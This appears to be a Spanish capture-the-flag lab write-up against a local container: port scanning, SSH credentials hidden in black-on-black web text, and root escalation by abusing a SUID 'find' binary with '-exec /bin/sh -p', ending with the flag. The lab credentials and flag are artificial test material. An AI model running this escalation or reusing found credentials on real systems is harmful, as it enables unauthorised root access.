# SUID-.evidencia
Comprometer el sistema mediante explotación de credenciales expuestas y escalada de privilegios abusando de binarios SUID.

Reconocimiento y Enumeración
Escaneo de Puertos
bash
nmap -sV -sC 172.17.0.2
Servicios Identificados:

✅ 22/tcp - SSH (OpenSSH)

✅ 8080/tcp - HTTP (Servicio Web)

Inspección Web (Puerto 8080)
Durante la inspección visual del servicio HTTP, se identificó una vulnerabilidad crítica de exposición de credenciales.

⚠️ Vulnerabilidades Identificadas
1. Credenciales Expuestas mediante Ocultamiento Visual Inefectivo
Tipo: Information Disclosure / Insecure Design

CVSS: 7.5 (High)

CWE: 798 (Use of Hard-coded Credentials)

Descripción: Credenciales SSH estaban "ocultas" usando texto negro sobre fondo negro, pero con espaciado visible que permitió su descubrimiento mediante simple selección de texto.

Credenciales Encontradas:

text
Usuario: student
Contraseña: Skylar/99
2. Binario SUID Mal Configurado
Binario: /usr/bin/find

Permisos: -rwsr-xr-x (SUID root)

Vulnerabilidad: Abuso de binario SUID para escalada de privilegios

💥 Explotación
Fase 1: Acceso Inicial (SSH)
Procedimiento:

Descubrimiento visual de credenciales en página web

Selección de texto reveló credenciales ocultas

Conexión SSH exitosa con credenciales obtenidas

Comando:

bash
ssh student@172.17.0.2
Fase 2: Reconocimiento Interno
Búsqueda de binarios SUID:

bash
find / -perm -4000 -type f -ls 2>/dev/null
Resultado Clave:

text
/usr/bin/find -rwsr-xr-x 1 root root 293048 Mar 23 2022
Fase 3: Escalada de Privilegios
Técnica: Abuso de binario SUID find

Comando de Explotación:

bash
/usr/bin/find . -exec /bin/sh -p \; -quit
Verificación:

bash
whoami  # Resultado: root
🏁 Captura de Flag
Acceso al directorio root:

bash
cd /root
ls
cat flag.txt
Flag Obtenida:

text
Rbp_Exi7
